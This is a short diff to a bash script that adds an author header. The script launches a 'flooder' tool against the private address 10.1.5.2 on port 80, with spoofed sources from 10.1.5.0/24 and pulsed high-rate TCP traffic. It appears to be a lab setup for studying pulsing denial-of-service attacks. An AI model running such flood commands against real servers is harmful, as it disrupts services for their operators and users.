@@ -1,4 +1,9 @@
 #!/bin/bash
+
+###############################
+# Author: Piva Davide         #
+###############################
+
 SERVER_IP="10.1.5.2"
 
 sudo flooder --dst $SERVER_IP --highrate 200000 --dportmin 80 --dportmax 80 --proto 6 --src 10.1.5.0 --srcmask 255.255.255.0 --ratetype pulse --lowrate 0 --lowtime 5000 --highrate 200000 --hightime 10000 &
